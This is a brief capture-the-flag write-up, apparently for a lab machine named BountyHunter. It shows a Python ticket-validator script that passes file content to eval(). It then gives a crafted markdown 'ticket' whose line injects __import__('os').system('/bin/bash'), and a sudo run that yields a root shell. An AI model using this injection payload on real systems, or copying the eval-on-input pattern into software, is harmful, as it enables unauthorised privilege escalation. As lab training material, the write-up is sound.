Privesc involves abusing a python code
```python
#Skytrain Inc Ticket Validation System 0.1   
#Do not distribute this file.                                   

def load_file(loc):                   
   if loc.endswith(".md"):                   
       return open(loc, 'r')                 
   else:  
       print("Wrong file type.")          
       exit() 
	   
def evaluate(ticketFile):         
   #Evaluates a ticket to check for ireggularities.
 code_line = None  
   for i,x in enumerate(ticketFile.readlines()):  
       if i == 0:  
           if not x.startswith("# Skytrain Inc"):  
               return False  
           continue  
       if i == 1:  
           if not x.startswith("## Ticket to "):  
               return False  
           print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")  
           continue  
  
       if x.startswith("__Ticket Code:__"):  
           code_line = i+1  
           continue  
  
       if code_line and i == code_line:  
           if not x.startswith("**"):  
               return False  
           ticketCode = x.replace("**", "").split("+")[0]  
           if int(ticketCode) % 7 == 4:  
               validationNumber = eval(x.replace("**", ""))  # RIGHT HERE!!
               if validationNumber > 100:  
                   return True  
               else:  
                   return False  
   return False  
  
def main():  
   fileName = input("Please enter the path to the ticket file.\n")  
   ticket = load_file(fileName)  
   #DEBUG print(ticket)  
   result = evaluate(ticket)  
   if (result):  
       print("Valid ticket.")  
   else:  
       print("Invalid ticket.")  
   ticket.close  
  
main()
```

So here's the ticket to root:
```md
# Skytrain Inc  
## Ticket to ROOT  
__Ticket Code:__ 0  
**18+__import__('os').system('/bin/bash')**  
##Issued: 2021/18/08  
#End Ticket
```

Execute the code and get root, easy
```bash
development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py   
Please enter the path to the ticket file.                                                      
/tmp/getmeroot.md                  
Destination: ROOT  
root@bountyhunter:/tmp#
```